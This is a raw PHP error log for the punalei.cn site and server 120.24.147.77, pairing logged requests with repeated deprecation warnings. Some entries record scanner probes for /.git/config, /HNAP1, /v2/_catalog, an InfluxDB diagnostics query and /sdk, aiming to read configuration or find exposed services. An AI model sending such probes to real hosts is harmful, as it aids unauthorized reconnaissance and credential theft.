[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T05:18:59+08:00 ] 113.215.189.103 GET 120.24.147.77/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T05:20:02+08:00 ] 104.248.240.171 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T05:20:04+08:00 ] 104.248.240.171 GET 120.24.147.77/odinhttpcall1773782403
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T05:20:04+08:00 ] 104.248.240.171 POST 120.24.147.77/sdk
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T05:20:04+08:00 ] 104.248.240.171 GET 120.24.147.77/odinhttpcall1773782403
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T05:20:04+08:00 ] 104.248.240.171 GET 120.24.147.77/sdk
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T05:20:05+08:00 ] 104.248.240.171 GET 120.24.147.77/HNAP1
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T05:20:05+08:00 ] 104.248.240.171 GET 120.24.147.77/HNAP1
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T05:20:05+08:00 ] 104.248.240.171 GET 120.24.147.77/evox/about
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T05:20:05+08:00 ] 104.248.240.171 GET 120.24.147.77/evox/about
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T05:20:06+08:00 ] 104.248.240.171 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T05:20:07+08:00 ] 104.248.240.171 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T05:20:10+08:00 ] 165.227.168.43 GET 120.24.147.77/v2/_catalog
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T05:20:10+08:00 ] 165.227.168.43 GET 120.24.147.77/v2/_catalog
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T05:39:29+08:00 ] 216.81.248.44 GET punalei.cn/.git/config
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T05:46:15+08:00 ] 66.132.153.140 GET 120.24.147.77/favicon.ico
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T05:46:15+08:00 ] 66.132.153.140 GET 120.24.147.77/favicon.ico
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T05:46:16+08:00 ] 66.132.153.140 GET 120.24.147.77/0kvmmmame
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T05:46:16+08:00 ] 66.132.153.140 GET 120.24.147.77/0kvmmmame
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T05:53:35+08:00 ] 71.6.199.65 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T05:55:14+08:00 ] 40.77.167.62 GET www.punalei.cn/ldcms/jiaoliubianpindianyuan/260.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T06:01:34+08:00 ] 40.77.167.136 GET www.punalei.cn/ldcms/punaleiPNAIduogongnenganguixilie/311.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T06:01:53+08:00 ] 164.92.178.52 POST 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T06:21:49+08:00 ] 185.247.137.3 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T06:26:24+08:00 ] 20.163.15.166 GET 120.24.147.77/login
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T06:26:24+08:00 ] 20.163.15.166 GET 120.24.147.77/login
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T06:30:01+08:00 ] 178.128.214.41 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T06:35:51+08:00 ] 20.98.165.171 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T06:36:27+08:00 ] 34.61.82.184 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T06:51:08+08:00 ] 52.167.144.146 GET www.punalei.cn/ldcms/2jidanxianggonglvjiPNL300xilie/318.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T06:56:38+08:00 ] 161.35.25.112 GET 120.24.147.77/query?q=SHOW+DIAGNOSTICS
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T06:56:38+08:00 ] 161.35.25.112 GET 120.24.147.77/query?q=SHOW+DIAGNOSTICS
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T06:59:51+08:00 ] 91.200.102.173 GET 120.24.147.77/.git/config
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T07:05:52+08:00 ] 87.121.84.76 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T07:11:46+08:00 ] 216.73.216.143 GET www.punalei.cn/sitemap.xml
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T07:11:46+08:00 ] 216.73.216.143 GET www.punalei.cn/sitemap.xml
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T07:29:44+08:00 ] 113.215.189.97 GET www.punalei.cn/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T07:29:44+08:00 ] 113.215.189.97 GET www.punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T07:30:01+08:00 ] 113.215.189.97 GET www.punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T07:30:01+08:00 ] 113.215.189.97 GET www.punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T07:30:01+08:00 ] 113.215.189.97 GET www.punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T07:30:02+08:00 ] 113.215.189.97 GET www.punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T07:30:12+08:00 ] 113.215.189.97 GET www.punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T07:30:13+08:00 ] 113.215.189.97 GET www.punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T07:30:26+08:00 ] 113.215.189.97 GET www.punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T07:30:26+08:00 ] 113.215.189.97 GET www.punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T07:30:39+08:00 ] 113.215.189.97 GET www.punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T07:30:41+08:00 ] 113.215.189.97 GET www.punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T07:30:52+08:00 ] 113.215.189.97 GET www.punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T07:30:54+08:00 ] 113.215.189.97 GET www.punalei.cn/
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T07:42:37+08:00 ] 113.215.189.97 GET www.punalei.cn/
